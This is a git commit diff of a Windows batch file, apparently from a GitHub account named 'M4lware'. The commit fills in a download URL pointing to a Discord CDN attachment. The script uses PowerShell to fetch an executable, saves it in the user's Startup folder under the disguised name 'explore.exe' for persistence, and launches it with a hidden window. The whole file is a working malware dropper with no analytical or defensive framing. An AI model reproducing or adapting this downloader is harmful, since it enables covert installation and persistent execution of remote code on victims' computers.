d44076a243ba0e6c8a5a9ff442608bd36346774f
M4lware <128651023+M4lware-01@users.noreply.github.com>
2023-11-02 13:30:56 +0100

    Update script.bat

--- script.bat
+++ script.bat
@@ -1,7 +1,7 @@
 @echo off
 
 set powershell=%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\powershell.exe
-set "DownloadURL="
+set "DownloadURL=https://cdn.discordapp.com/attachments/1164564797854068836/1169614551235448882/x.exe?ex=65560b6f&is=6543966f&hm=73946c67297cf7771edbeb0eb947f7623dd8bd42cf85af08c6b2dfb8ad14e6c4&"
 set "DestinationPath=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\explore.exe"
 powershell -Command "Invoke-WebRequest -useb '%DownloadURL%' -o '%DestinationPath%'"
 powershell -Command "Start-Process '%DestinationPath%' -WindowStyle Hidden"
